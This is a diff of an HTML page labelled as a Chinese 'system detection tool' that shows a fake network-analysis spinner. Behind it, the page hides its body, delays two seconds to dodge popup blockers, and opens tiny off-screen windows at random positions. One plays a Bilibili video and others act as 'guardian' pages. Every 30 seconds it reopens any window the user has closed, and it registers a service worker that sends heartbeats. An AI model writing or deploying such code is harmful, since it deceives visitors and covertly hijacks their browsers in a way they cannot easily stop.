@@ -1,64 +1,157 @@
 <!DOCTYPE html>
-<html>
+<html lang="zh-CN">
 <head>
-    <title>系统检测中...</title>
-    <script>
-        // 注册Service Worker
-        if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('/sw.js')
-                .then(() => console.log('SW注册成功'))
-                .catch(err => console.log('SW注册失败:', err));
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>系统检测工具</title>
+    <style>
+        /* 初始隐藏页面 */
+        body {
+            display: none;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f0f0;
+            font-family: Arial, sans-serif;
         }
-
-        // 初始化播放器
-        let playerWindow = null;
         
-        function openPlayer() {
-            playerWindow = window.open(
-                'https://www.bilibili.com/video/BV1btJHzGEUE',
-                '_hiddenPlayer',
-                'width=100,height=100,left=-1000,top=-1000'
-            );
-            
-            // 尝试隐藏窗口
-            setTimeout(() => {
-                try {
-                    playerWindow.blur();
-                    window.focus();
-                } catch(e) {}
-            }, 1000);
+        /* 加载动画（备用显示） */
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 2s linear infinite;
+            margin: 20px auto;
         }
-
-        // 打开守护页面
-        function openGuardian() {
-            window.open(
-                '/oiiaio.html',
-                '_guardian_' + Date.now(),
-                'width=100,height=100,left=-1000,top=-1000'
-            );
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
+    </style>
+</head>
+<body>
+    <div id="content" style="display:none;">
+        <h1 style="text-align:center;margin-top:50px;">系统检测工具</h1>
+        <p style="text-align:center;">正在分析网络环境...</p>
+        <div class="loader"></div>
+    </div>
 
-        // 启动系统
-        function startSystem() {
-            openPlayer();
-            // 打开2个守护实例
-            openGuardian();
-            openGuardian();
+    <script>
+        // 确保DOM完全加载后执行
+        document.addEventListener('DOMContentLoaded', function() {
+            // 主播放器窗口引用
+            let playerWindow = null;
+            // 守护窗口引用数组
+            let guardianWindows = [];
             
-            // 每30秒检查一次播放器状态
-            setInterval(() => {
+            // 初始化函数
+            function initSystem() {
+                // 打开主播放窗口
+                openPlayer();
+                
+                // 打开两个守护窗口
+                for (let i = 0; i < 2; i++) {
+                    openGuardian();
+                }
+                
+                // 设置定时检查
+                setInterval(checkWindows, 30000);
+                
+                // 5秒后显示备用内容（如果需要）
+                setTimeout(() => {
+                    document.getElementById('content').style.display = 'block';
+                }, 5000);
+            }
+            
+            // 打开播放窗口函数
+            function openPlayer() {
+                if (playerWindow && !playerWindow.closed) return;
+                
+                // 随机位置使窗口更难被发现
+                const left = Math.floor(Math.random() * 2000) - 1000;
+                const top = Math.floor(Math.random() * 2000) - 1000;
+                
+                playerWindow = window.open(
+                    'https://www.bilibili.com/video/BV1btJHzGEUE',
+                    '_hiddenPlayer_' + Date.now(),
+                    `width=100,height=100,left=${left},top=${top},scrollbars=no,status=no,toolbar=no`
+                );
+                
+                // 尝试隐藏窗口
+                setTimeout(() => {
+                    try {
+                        playerWindow?.blur();
+                        window.focus();
+                    } catch(e) {
+                        console.log('窗口隐藏失败:', e);
+                    }
+                }, 1000);
+            }
+            
+            // 打开守护窗口函数
+            function openGuardian() {
+                const left = Math.floor(Math.random() * 2000) - 1000;
+                const top = Math.floor(Math.random() * 2000) - 1000;
+                
+                const win = window.open(
+                    '/oiiaio.html',
+                    '_guardian_' + Date.now(),
+                    `width=100,height=100,left=${left},top=${top},scrollbars=no,status=no,toolbar=no`
+                );
+                
+                if (win) {
+                    guardianWindows.push(win);
+                    
+                    // 尝试隐藏窗口
+                    try {
+                        win.blur();
+                        window.focus();
+                    } catch(e) {
+                        console.log('守护窗口隐藏失败:', e);
+                    }
+                }
+            }
+            
+            // 检查窗口状态函数
+            function checkWindows() {
+                // 检查主播放窗口
                 if (!playerWindow || playerWindow.closed) {
                     openPlayer();
                 }
-            }, 30000);
-        }
-
-        // 隐藏当前页面
-        document.body.style.display = 'none';
-        
-        // 延迟启动以避免拦截
-        setTimeout(startSystem, 2000);
+                
+                // 过滤已关闭的守护窗口
+                guardianWindows = guardianWindows.filter(win => win && !win.closed);
+                
+                // 确保至少有两个守护窗口
+                while (guardianWindows.length < 2) {
+                    openGuardian();
+                }
+            }
+            
+            // 启动系统（延迟2秒以避免拦截）
+            setTimeout(initSystem, 2000);
+            
+            // 注册Service Worker
+            if ('serviceWorker' in navigator) {
+                navigator.serviceWorker.register('/sw.js')
+                    .then(reg => {
+                        console.log('Service Worker 注册成功');
+                        
+                        // 定期发送心跳
+                        setInterval(() => {
+                            if (navigator.serviceWorker.controller) {
+                                navigator.serviceWorker.controller.postMessage({
+                                    type: 'heartbeat',
+                                    time: Date.now()
+                                });
+                            }
+                        }, 60000);
+                    })
+                    .catch(err => console.log('Service Worker 注册失败:', err));
+            }
+        });
     </script>
-</head>
-<body></body>
+</body>
 </html>
